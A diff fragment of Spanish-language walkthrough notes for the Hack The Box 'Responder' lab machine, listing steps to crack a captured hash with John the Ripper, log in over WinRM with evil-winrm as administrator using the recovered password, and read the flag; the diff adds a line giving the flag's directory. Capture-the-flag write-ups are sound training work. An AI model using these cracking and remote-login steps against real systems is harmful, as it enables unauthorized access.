@@ -10,4 +10,7 @@ HACK THE BOX - MACHINE RESPONDER
 - john -w=/usr/share/wordlitsts/rockyou.txt hash.txt						-Mediante el uso de la herramienta JohnTheRipper, hacemos un cracking del hash y obtenemos el password en texto plano
 - evil-winrm -i 10.129.125.215 -u administrator -p badminton				-Usando la herramienta "Evil-winrm" hacemos una conexión remota con el host a través del puerto 5985.
 - dir o Get-ChildItem -Recurse												-Una vez en el host remoto, podemos listar los documentos y archivo con el comando Dir /A(en CMD) o también Get-ChilItem -Recurse (en PowerShell)
+
+	-Encontramos la flag en el directorio C:\Users\mike\Desktop>
+
 - type flag.txt																-Una vez en el directorio en el que se encuentra el flag. a través del comando TYPE vemos su contenido.
